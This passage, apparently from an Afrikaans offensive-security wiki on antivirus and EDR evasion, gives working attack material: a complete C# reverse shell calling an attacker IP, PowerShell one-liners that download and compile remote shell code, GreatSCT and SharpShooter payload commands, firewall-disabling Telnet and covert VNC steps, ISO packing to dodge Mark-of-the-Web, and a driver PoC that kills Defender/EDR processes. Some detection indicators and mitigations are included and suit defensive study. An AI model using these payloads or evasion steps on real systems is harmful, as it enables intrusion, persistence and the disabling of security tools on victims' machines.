4.  Handmatige opruiming – voer die resulterende binary in dnSpy uit en soek na groot Base64-blobs of gebruik van `RijndaelManaged`/`TripleDESCryptoServiceProvider` om die *werklike* payload te vind. Dikwels stoor die malware dit as ’n TLV-geënkodeerde byte array wat binne `<Module>.byte_0` geïnisialiseer word.

Die bogenoemde ketting herstel die uitvoeringsvloei **sonder** dat jy die kwaadwillige sample hoef uit te voer – nuttig wanneer jy op ’n offline-werkstasie werk.

> 🛈  ConfuserEx produseer ’n pasgemaakte attribuut genaamd `ConfusedByAttribute` wat as ’n IOC gebruik kan word om samples outomaties te triageer.

#### Eenreël
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-obfuskator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om ’n oopbron-fork van die [LLVM](http://www.llvm.org/)-samestellingsuite te bied wat verbeterde sagtewaresekuriteit deur [kode-obfuskering](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en peuterbeskerming kan bied.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe die `C++11/14`-taal gebruik kan word om tydens samestelling obfuskate kode te genereer, sonder enige eksterne nutsmiddel en sonder om die samesteller te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg ’n laag obfuskate bewerkings by wat deur die C++-template-metaprogrammeringsraamwerk gegenereer word, wat die lewe van iemand wat die toepassing wil kraak ’n bietjie moeiliker maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is ’n x64-binêre obfuskator wat verskeie soorte PE-lêers kan obfuskate, waaronder .exe, .dll en .sys.
- [**metame**](https://github.com/a0rtega/metame): Metame is ’n eenvoudige metamorfiese kode-enjin vir arbitrêre uitvoerbare lêers.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is ’n fynkorrelige kode-obfuskeringraamwerk vir LLVM-ondersteunde tale wat ROP (return-oriented programming) gebruik. ROPfuscator obfuskate ’n program op samestellingskodeniveau deur gewone instruksies in ROP-kettings om te skakel, wat ons natuurlike begrip van normale beheervloei verydel.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is ’n .NET PE Crypter wat in Nim geskryf is.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL-lêers in shellcode omskakel en dit dan laai.

### LLVM-samestellerondersteunde selfmaskering per funksie

In plaas daarvan om ’n hele implantaat net te masker terwyl dit slaap, kan ’n gewysigde LLVM X86-backend geselekteerde funksies met XOR masker wanneer hulle onaktief is. Die Function Peekaboo PoC kies gedemanglede name wat `REG_` bevat, voeg posisie-onafhanklike begin-/eindstubs om die finale masjienkode in, en genereer een gedeelde maskerhanteraar in `.text`; handtekeninge op bronkodeniveau en die Windows x64-aanroepkonvensie bly onveranderd.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformasie van die backend-beheervloei

Dit hoort ná instruksiekeuse en optimalisering, omdat die transformasie **elke gegenereerde return** moet dek en die presiese x86-uitleg moet ken. ’n `MachineFunctionPass` voor emissie vind die laaste `MachineInstr::isReturn()`, verwyder dit sodat die finale pad in die aangehegte epiloog invloei, en vervang vroeëre returns met `JMP_1 handler`. Behou enige samestellergegenereerde stapel-/raamafbreekkode voor elke return; herlei net die return-instruksie self.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` en `emitFunctionBodyEnd()` stuur die stubs per funksie uit, terwyl `emitEndOfAsmFile()` die hanteraar uitstuur. Simbole wat tussen emissiefases gedeel word, laat ’n proloogvertakking toe om na sy latere epiloog te mik; skryf vir ’n handmatig uitgestuurde nabygeleë `je` `0F 84`, gevolg deur die viergreep-MC-uitdrukking `target - address_after_je`. Oproepe en spronge na die hanteraar kan eerder as `MCInst`-objekte uitgestuur word (`CALL64pcrel32` en `JMP_1`). ’n Pass moet `false` teruggee vir ’n nie-geselekteerde funksie indien dit niks verander het nie; die PoC gee verkeerdelik `true` terug op daardie pad.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata en pre-CRT-initialisering

Die PoC plaas ’n XOR-sleutel en 16-greep-rekords in `.funcmeta`, met ’n loader-herlokeerde funksiewyser plus ’n looptydlengte. Hoewel die C-veld ’n `uint32_t` is, verkry die hanteraar ’n QWORD by rekordverskuiwing `+8`, wat die lengte en sy opvulgrepe verbruik, en beweeg rekords met `0x10` aan. PE-seksiename is net agt grepe lank, dus sien die looptydsoektog `.funcmet`. ’n Eksterne patcher voeg ’n uitvoerbare `.stub` by, stoor die ou toegangspunt-RVA in die stub en herlei `AddressOfEntryPoint`; die PIC-stub kry die beeldbasis vanaf `gs:[0x60]` → `[PEB+0x10]`, loop deur PE32+-invoere om ’n reeds ingevoerde `VirtualProtect` op te los, en loop voor die CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Initialisering stel ’n sentinel in `gs:[0xE8]` en roep elke metadatafunksie aan. Die permanent leesbare proloog stoor die funksiebegin in `gs:[0xF0]`, bespeur die sentinel en slaan die liggaam oor wat nog nie gemasker is nie. Die epiloog gebruik dan `call handler`; nadat die hanteraar 13 registers (`0x68` grepe) gestoor het, is die return-adres by `[rsp+0x68]` die einde van die getransformeerde funksie, sodat `end - start` in sy metadatarekord geskryf kan word. Die stub maak die sentinel skoon en spring na `ImageBase + original_entry_point_RVA` nadat al die liggame gemasker is.<sup>[[38]](#references)[[39]](#references)</sup>

Tydens ’n normale oproep roep die proloog dieselfde simmetriese hanteraar aan om die liggaam te dekodeer. Die finale pad vloei in die aangehegte epiloog in, terwyl elke vroeëre return regstreeks na die gedeelde hanteraar spring. Die normale epiloog gebruik ook `jmp handler` in plaas van `call`, sodat die hanteraar se `ret` die oorspronklike oproeper se return-adres verbruik nadat dit weer gemasker het, en die funksieresultaat in `RAX` behoue bly.<sup>[[38]](#references)[[39]](#references)</sup>

#### Maskeringsprimitief en ontledingsaanwysers

Die hanteraar vind die huidige rekord, slaan die vaste sigbare proloog oor (`0x46` grepe in hierdie bou), verander die res na `PAGE_EXECUTE_READWRITE`, pas XOR greep vir greep toe met die lae greep van die sleutel, en stel dit dan op `PAGE_EXECUTE_READ`. Dieselfde lus dekodeer dus met toegang en enkodeer met elke normale uitgang.<sup>[[38]](#references)[[39]](#references)</sup>

Aanwysers met ’n hoë seinwaarde vir hierdie ontwerp sluit in:<sup>[[38]](#references)[[39]](#references)</sup>

- ’n toegangspunt binne ’n uitvoerbare `.stub` en ’n `.funcmet`-seksie met ’n sleutel plus herlokeerde `.text`-wysers;
- pre-CRT-ontleding van die PEB, invoertabel en seksietabel, gevolg deur oproepe deur elke metadatapointer;
- identiese `call`/`pop`-PIC-proloë en baie return-punte wat na een hanteraar herlei word;
- skryfbewerkings na `gs:[0xE8]`, `gs:[0xF0]` en `gs:[0xF8]`, gevolg deur herhaalde `VirtualProtect`-oorgange en greep-vir-greep XOR-skryfbewerkings na uitvoerbare bladsye wat deur die beeldlêer gerugsteun word.

Dit ontduik geheueskandeerders; dit is nie kriptografiese beskerming nie: die gelapte lêer bevat steeds die oorspronklike onversluierde liggaam, en ’n debugger kan op `VirtualProtect` of die XOR-lus breek en die aktiewe funksie dump. Die enkelgreep-XOR, leesbare metadata en vaste `0x46`-grens maak ook vanlyn herstel eenvoudig.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Die PoC se TEB-gleuwe is draadspesifiek, maar die gewysigde kodebladsye is proseswyd. Gelyktydige of rekursiewe toegang kan instruksies dus weer omskakel terwyl ’n ander aanroep dit uitvoer; uitsonderings en nie-plaaslike uitgange kan ook her-maskering omseil. ’n Robuuste implementering moet oorgange sinkroniseer, die beskerming herstel wat werklik via `lpflOldProtect` teruggegee is, hardgekodeerde stublengtes vermy, beide `call`- en `jmp`-paaie vir x64-stapelbelyning nagaan, en `FlushInstructionCache` aanroep nadat uitvoerbare grepe herskryf is. Microsoft stel uitdruklik die oproeper verantwoordelik vir instruksiekas-koherensie wanneer uitvoerbare kode gewysig word.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen en MoTW

Jy het dalk hierdie skerm gesien wanneer jy sommige uitvoerbare lêers van die internet aflaai en dit uitvoer.

Microsoft Defender SmartScreen is ’n sekuriteitsmeganisme wat bedoel is om eindgebruikers te beskerm teen die uitvoer van moontlik kwaadwillige toepassings.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik op grond van reputasie. Dit beteken dat toepassings wat nie dikwels afgelaai word nie, SmartScreen sal aktiveer, wat die eindgebruiker waarsku en verhoed om die lêer uit te voer (hoewel die lêer steeds uitgevoer kan word deur More Info -> Run anyway te klik).

**MoTW** (Mark of The Web) is ’n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier, wat outomaties geskep word wanneer lêers van die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir ’n lêer wat van die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om daarop te let dat uitvoerbare lêers wat met ’n **vertroude** ondertekeningsertifikaat onderteken is, **nie SmartScreen sal aktiveer nie**.

’n Baie doeltreffende manier om te verhoed dat jou payloads die Mark of The Web kry, is om hulle in ’n soort houer, soos ’n ISO, te verpak. Dit gebeur omdat Mark-of-the-Web (MOTW) **nie** op **nie-NTFS**-volumes toegepas kan word nie.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is ’n nutsmiddel wat payloads in uitvoerhouers verpak om Mark-of-the-Web te ontduik.

Voorbeeldgebruik:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hier is ’n demo van hoe om SmartScreen te omseil deur payloads in ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is ’n kragtige aantekenmeganisme in Windows waarmee toepassings en stelselkomponente **gebeurtenisse kan aanteken**. Sekuriteitsprodukte kan dit egter ook gebruik om kwaadwillige aktiwiteite te monitor en op te spoor.

Net soos AMSI gedeaktiveer (omseil) word, is dit ook moontlik om die **`EtwEventWrite`**-funksie van die gebruikersruimteproses onmiddellik te laat terugkeer sonder om enige gebeurtenisse aan te teken. Dit word gedoen deur die funksie in die geheue te patch sodat dit onmiddellik terugkeer, wat ETW-aantekening vir daardie proses effektief deaktiveer.

Jy kan meer inligting kry by **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) en [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Dit is al geruime tyd bekend dat C#-binaries in die geheue gelaai kan word, en dit is steeds ’n baie goeie manier om jou post-exploitation-nutsgoed te laat loop sonder om deur AV opgespoor te word.

Aangesien die payload direk in die geheue gelaai word sonder om die skyf te raak, hoef ons net bekommerd te wees oor die patch van AMSI vir die hele proses.

Die meeste C2-raamwerke (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C#-assemblies direk in die geheue uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels dat **’n nuwe weggooiproses geskep word**, jou kwaadwillige post-exploitation-kode in daardie nuwe proses ingespuit word, die kwaadwillige kode uitgevoer word en die nuwe proses beëindig word wanneer dit klaar is. Dit het voordele sowel as nadele. Die voordeel van die fork-and-run-metode is dat uitvoering **buite** ons Beacon-implantproses plaasvind. Dit beteken dat as iets met ons post-exploitation-aksie verkeerd loop of opgespoor word, daar ’n **veel groter kans** is dat ons **implant oorleef.** Die nadeel is dat daar ’n **groter kans** is om deur **gedragsopsporing** gevang te word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit behels dat die kwaadwillige post-exploitation-kode **in sy eie proses** ingespuit word. Só kan jy vermy dat jy ’n nuwe proses moet skep en dit deur AV laat skandeer, maar die nadeel is dat as iets verkeerd loop wanneer jou payload uitgevoer word, daar ’n **veel groter kans** is dat jy jou **beacon verloor**, aangesien dit kan omval.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer wil lees oor die laai van C# Assembly, kyk gerus na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C#-assemblies **vanuit PowerShell** laai. Kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t se video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Gebruik van Ander Programmeringstale

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode met ander tale uit te voer deur die gekompromitteerde masjien toegang **te gee tot die interpreter-omgewing wat op die aanvallerbeheerde SMB-share geïnstalleer is**.

Deur toegang tot die interpreter-binaries en die omgewing op die SMB-share toe te laat, kan jy **willekeurige kode in hierdie tale binne die geheue** van die gekompromitteerde masjien uitvoer.

Die repo dui aan: Defender skandeer steeds die scripts, maar deur Go, Java, PHP, ens. te gebruik, het ons **meer buigsaamheid om statiese handtekeninge te omseil**. Toetse met ewekansige, nie-verdoeselde reverse shell-scripts in hierdie tale was suksesvol.

## WebAssembly-herhuisvesting om statiese ontleding te ontduik

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuleer die toegangstoken van ’n sekuriteitsproduk soos ’n EDR of AV. Deur die token se voorregte te verminder, kan die proses aan die gang bly, terwyl dit verhinder word om bevoorregte inspeksie- of remediëringsaksies uit te voer.

Om dit te voorkom, kan Windows **eksterne prosesse verhoed** om handvatsels na die tokens van sekuriteitsprosesse te verkry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Gebruik van Vertroude Sagteware

### Chrome Remote Desktop

Soos beskryf in [**hierdie blogplasing**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om Chrome Remote Desktop op ’n slagoffer se rekenaar te installeer en dit dan te gebruik om beheer daaroor te neem en volharding te handhaaf:<sup>[[35]](#references)</sup>
1. Laai dit af vanaf https://remotedesktop.google.com/, klik op "Set up via SSH" en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
2. Voer die installeerder stilweg op die slagoffer se masjien uit (admin word vereis): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop-bladsy en klik volgende. Die assistent sal jou dan vra om te magtig; klik op die Authorize-knoppie om voort te gaan.
4. Voer die verskafte opdrag met die nodige aanpassings uit: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (die `--pin`-parameter stel die PIN sonder om die GUI te gebruik).
 

## Gevorderde Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion is ’n baie ingewikkelde onderwerp. Soms moet jy baie verskillende telemetriebronne op net een stelsel in ag neem, daarom is dit feitlik onmoontlik om in volwasse omgewings heeltemal onopgespoor te bly.

Elke omgewing waarteen jy te staan kom, het sy eie sterk- en swakpunte.

Ek raai jou sterk aan om hierdie praatjie deur [@ATTL4S](https://twitter.com/DaniLJ94) te kyk om ’n vastrapplek in meer gevorderde Evasion-tegnieke te kry.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dit is ook nog ’n uitstekende praatjie deur [@mariuszbit](https://twitter.com/mariuszbit) oor Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Ou Tegnieke**

### **Kyk watter dele Defender as kwaadwillig beskou**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik, wat **dele van die binary verwyder** totdat dit **vasstel watter deel Defender** as kwaadwillig beskou, en dit vir jou afsonder.\
Nog ’n nutsding wat **dieselfde doen, is** [**avred**](https://github.com/dobin/avred), met ’n oop webdiens wat beskikbaar is by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Tot en met Windows 10 het alle Windows-weergawes ’n **Telnet Server** ingesluit wat jy kon installeer (as administrateur) deur die volgende uit te voer:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Laat dit **begin** wanneer die stelsel begin en **voer** dit nou uit:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Verander telnet-poort** (stealth) en deaktiveer firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Laai dit af by: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin-aflaaie hê, nie die setup nie)

**OP DIE HOST**: Voer _**winvnc.exe**_ uit en konfigureer die server:

- Aktiveer die opsie _Disable TrayIcon_
- Stel ’n wagwoord in by _VNC Password_
- Stel ’n wagwoord in by _View-Only Password_

Skuif dan die binary _**winvnc.exe**_ en die **nuut** geskepte lêer _**UltraVNC.ini**_ na die **slagoffer**

#### **Reverse connection**

Die **aanvaller** moet die binary `vncviewer.exe -listen 5900` op sy **host** uitvoer sodat dit **gereed** is om ’n reverse **VNC connection** te ontvang. Begin dan op die **slagoffer** die winvnc-daemon met `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit.

**WAARSKUWING:** Om stealth te behou, moet jy sekere dinge nie doen nie

- Moenie `winvnc` begin as dit reeds loop nie, anders sal jy ’n [popup](https://i.imgur.com/1SROTTl.png) veroorsaak. Kyk of dit loop met `tasklist | findstr winvnc`
- Moenie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie, anders sal [die konfigurasievenster](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moenie `winvnc -h` uitvoer vir hulp nie, anders sal jy ’n [popup](https://i.imgur.com/oc18wcu.png) veroorsaak

### GreatSCT

Laai dit af by: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Binne GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Begin nou **die lister** met `msfconsole -r file.rc` en **voer** die **xml payload** uit met:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Die huidige Defender sal die proses baie vinnig beëindig.**

### Ons eie reverse shell saamstel

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Stel dit saam met:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Gebruik dit met:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# met behulp van compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lys van C#-obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Voorbeeld van die gebruik van Python om injectors te bou:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander tools

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Meer

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR uitskakel vanuit Kernel Space

Storm-2603 het ’n klein konsolehulpmiddel genaamd **Antivirus Terminator** gebruik om endpoint-beskerming te deaktiveer voordat dit ransomware laat val het. Die hulpmiddel bring sy **eie kwesbare maar *signed* driver** saam en misbruik dit om bevoorregte kernel-bewerkings uit te voer wat selfs Protected-Process-Light (PPL) AV-dienste nie kan blokkeer nie.<sup>[[12]](#references)</sup>

Belangrike wegneemetes
1. **Signed driver**: Die lêer wat na die skyf afgelewer word, is `ServiceMouse.sys`, maar die binêre lêer is die wettig ondertekende driver `AToolsKrnl64.sys` van Antiy Labs se “System In-Depth Analysis Toolkit”. Omdat die driver ’n geldige Microsoft-handtekening het, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) geaktiveer is.
2. **Diensinstallasie**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Die eerste reël registreer die driver as ’n **kernel-diens**, en die tweede begin dit sodat `\\.\ServiceMouse` vanaf user land toeganklik word.
3. **IOCTLs wat deur die driver beskikbaar gestel word**
   | IOCTL-kode | Vermoë                                  |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Beëindig ’n arbitrêre proses volgens PID (word gebruik om Defender/EDR-dienste te beëindig) |
   | `0x990000D0` | Vee ’n arbitrêre lêer op die skyf uit |
   | `0x990001D0` | Laai die driver af en verwyder die diens |

   Minimale C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Waarom dit werk**: BYOVD omseil user-mode-beskermings heeltemal; kode wat in die kernel uitgevoer word, kan *protected* prosesse oopmaak, beëindig of met kernel-objekte peuter, ongeag PPL/PP, ELAM of ander hardening-kenmerke.

Opsporing / Versagting
•  Aktiveer Microsoft se lys van geblokkeerde kwesbare drywers (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laai.
•  Monitor die skep van nuwe *kernel*-dienste en stuur ’n waarskuwing wanneer ’n drywer vanaf ’n wêreldskryfbare gids gelaai word of nie op die allow-list voorkom nie.
•  Hou dop vir user-mode-handvatsels na pasgemaakte toestelobjekte, gevolg deur verdagte `DeviceIoControl`-oproepe.

### Omseiling van Zscaler Client Connector se houdingskontroles deur binêre lêers op die skyf te patch

